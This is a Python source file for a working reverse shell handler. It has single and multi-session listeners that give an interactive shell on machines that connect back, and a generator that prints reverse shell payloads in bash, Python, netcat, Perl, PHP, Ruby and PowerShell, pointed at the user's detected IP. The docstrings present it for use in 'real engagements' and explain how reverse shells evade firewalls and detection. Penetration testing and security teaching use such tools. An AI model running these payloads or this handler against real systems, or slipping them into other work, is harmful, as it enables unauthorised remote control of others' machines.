#!/usr/bin/env python3
"""
Reverse Shell Handler
=====================
WHAT THIS DOES:
    Listens for incoming reverse shell connections. When a compromised
    machine connects back to you, this gives you an interactive command
    shell on that machine.

WHY IT MATTERS:
    In a real engagement, after exploiting a vulnerability, you need
    a way to interact with the compromised system. A "reverse shell"
    is when the TARGET connects to YOU (the attacker). This is
    preferred over a "bind shell" because:
    - It bypasses firewalls (outbound connections are usually allowed)
    - It works behind NAT
    - It's harder to detect than an open listening port on the target

HOW IT WORKS:
    Attacker (you):
        1. Start this listener on your machine
        2. It waits for incoming connections

    Target (compromised machine):
        1. Runs a payload that connects back to your IP
        2. Redirects its shell (bash/sh) through the connection
        3. You now have a remote shell

    Common payloads to trigger on the target:
        bash:    bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
        python:  python3 -c 'import socket,os,pty; ...'
        netcat:  nc -e /bin/sh YOUR_IP PORT

USAGE:
    python3 revshell.py                    # listen on 0.0.0.0:4444
    python3 revshell.py -p 9001            # custom port
    python3 revshell.py --generate bash    # generate payload
"""

import sys
import socket
import select
import argparse
import threading
from datetime import datetime


def generate_payload(lhost, lport, payload_type="bash"):
    """
    Generate reverse shell payloads for different languages/tools.

    These are the commands you'd run ON THE TARGET to connect back
    to your listener. In a real engagement, you'd deliver these
    through an exploit (command injection, file upload, etc.)
    """
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",

        "bash-udp": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",

        "python": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),

        "python-short": (
            f"python3 -c 'import os,pty,socket;"
            f"s=socket.socket();"
            f"s.connect((\"{lhost}\",{lport}));"
            f"[os.dup2(s.fileno(),f)for f in(0,1,2)];"
            f"pty.spawn(\"/bin/sh\")'"
        ),

        "nc": f"nc -e /bin/sh {lhost} {lport}",

        "nc-mkfifo": (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {lhost} {lport} >/tmp/f"
        ),

        "perl": (
            f"perl -e 'use Socket;"
            f"$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
        ),

        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),

        "ruby": (
            f"ruby -rsocket -e '"
            f"f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),

        "powershell": (
            f"powershell -nop -c \"$client = New-Object "
            f"System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
            f".GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()\""
        ),
    }

    return payloads.get(payload_type, payloads)


def listener(lhost="0.0.0.0", lport=4444):
    """
    Start a reverse shell listener.

    Waits for incoming connections and provides an interactive shell
    when a target connects.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((lhost, lport))
    except PermissionError:
        print(f"[!] Permission denied on port {lport}. Try a port > 1024.")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Cannot bind to {lhost}:{lport} — {e}")
        sys.exit(1)

    server.listen(1)
    print(f"[*] Listening on {lhost}:{lport}")
    print(f"[*] Waiting for incoming connection...")
    print(f"[*] Use Ctrl+C to stop\n")

    try:
        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        print(f"[+] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Type commands. Use 'exit' to close.\n")

        client.setblocking(False)

        while True:
            # Check if there's data from the remote shell
            ready, _, _ = select.select([client, sys.stdin], [], [], 0.5)

            for s in ready:
                if s == client:
                    try:
                        data = client.recv(4096)
                        if not data:
                            print("\n[!] Connection closed by remote host")
                            return
                        sys.stdout.write(data.decode("utf-8", errors="ignore"))
                        sys.stdout.flush()
                    except (ConnectionResetError, BrokenPipeError):
                        print("\n[!] Connection lost")
                        return

                elif s == sys.stdin:
                    cmd = sys.stdin.readline()
                    if cmd.strip().lower() == "exit":
                        print("[*] Closing connection")
                        client.close()
                        return
                    try:
                        client.send(cmd.encode())
                    except (ConnectionResetError, BrokenPipeError):
                        print("\n[!] Connection lost")
                        return

    except KeyboardInterrupt:
        print("\n[*] Listener stopped")
    finally:
        server.close()


def multi_listener(lhost="0.0.0.0", lport=4444):
    """
    Multi-session handler — accept multiple reverse shells.

    In a real engagement, you might compromise multiple machines.
    This handles all of them.
    """
    sessions = {}
    session_counter = 0

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((lhost, lport))
    server.listen(5)

    print(f"[*] Multi-handler listening on {lhost}:{lport}")
    print(f"[*] Commands: sessions, interact <id>, exit")

    def accept_connections():
        nonlocal session_counter
        while True:
            try:
                client, addr = server.accept()
                session_counter += 1
                sessions[session_counter] = {
                    "socket": client,
                    "addr": addr,
                    "time": datetime.now(),
                }
                print(f"\n[+] Session {session_counter} opened: {addr[0]}:{addr[1]}")
            except OSError:
                break

    # Accept connections in background
    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()

    try:
        while True:
            cmd = input("\nhandler> ").strip()

            if cmd == "sessions":
                if not sessions:
                    print("No active sessions")
                else:
                    print(f"\n{'ID':<6} {'Address':<22} {'Connected'}")
                    print("-" * 50)
                    for sid, info in sessions.items():
                        print(f"{sid:<6} {info['addr'][0]}:{info['addr'][1]:<14} "
                              f"{info['time'].strftime('%H:%M:%S')}")

            elif cmd.startswith("interact"):
                parts = cmd.split()
                if len(parts) != 2:
                    print("Usage: interact <session_id>")
                    continue
                sid = int(parts[1])
                if sid not in sessions:
                    print(f"Session {sid} not found")
                    continue
                print(f"[*] Interacting with session {sid}. Type 'background' to return.")
                interact_session(sessions[sid]["socket"])

            elif cmd == "exit":
                break

            elif cmd:
                print("Commands: sessions, interact <id>, exit")

    except KeyboardInterrupt:
        print("\n[*] Handler stopped")
    finally:
        for info in sessions.values():
            info["socket"].close()
        server.close()


def interact_session(client):
    """Interactive session with a connected shell."""
    client.setblocking(False)

    while True:
        ready, _, _ = select.select([client, sys.stdin], [], [], 0.5)

        for s in ready:
            if s == client:
                try:
                    data = client.recv(4096)
                    if not data:
                        print("[!] Session closed")
                        return
                    sys.stdout.write(data.decode("utf-8", errors="ignore"))
                    sys.stdout.flush()
                except Exception:
                    print("[!] Session error")
                    return

            elif s == sys.stdin:
                cmd = sys.stdin.readline()
                if cmd.strip() == "background":
                    print("[*] Session backgrounded")
                    return
                try:
                    client.send(cmd.encode())
                except Exception:
                    print("[!] Failed to send")
                    return


def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Handler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 revshell.py                       Listen on 0.0.0.0:4444
  python3 revshell.py -p 9001               Custom port
  python3 revshell.py --multi               Multi-session handler
  python3 revshell.py --generate bash       Generate bash payload
  python3 revshell.py --generate all        Show all payloads
        """
    )

    parser.add_argument("-l", "--lhost", default="0.0.0.0",
                        help="Listen address (default: 0.0.0.0)")
    parser.add_argument("-p", "--lport", type=int, default=4444,
                        help="Listen port (default: 4444)")
    parser.add_argument("--multi", action="store_true",
                        help="Multi-session handler")
    parser.add_argument("--generate", metavar="TYPE",
                        help="Generate payload (bash, python, nc, php, ruby, "
                        "perl, powershell, all)")

    args = parser.parse_args()

    if args.generate:
        # Need the attacker's actual IP for payloads
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            my_ip = s.getsockname()[0]
            s.close()
        except Exception:
            my_ip = "YOUR_IP"

        if args.generate == "all":
            payloads = generate_payload(my_ip, args.lport, "all")
            print(f"\nReverse Shell Payloads → {my_ip}:{args.lport}\n")
            print("=" * 60)
            for name, payload in payloads.items():
                print(f"\n[{name}]")
                print(payload)
            print()
        else:
            payload = generate_payload(my_ip, args.lport, args.generate)
            if isinstance(payload, dict):
                print(f"Unknown type. Available: {', '.join(payload.keys())}")
            else:
                print(f"\nPayload ({args.generate}) → {my_ip}:{args.lport}:\n")
                print(payload)
                print()
        return

    if args.multi:
        multi_listener(args.lhost, args.lport)
    else:
        listener(args.lhost, args.lport)


if __name__ == "__main__":
    main()
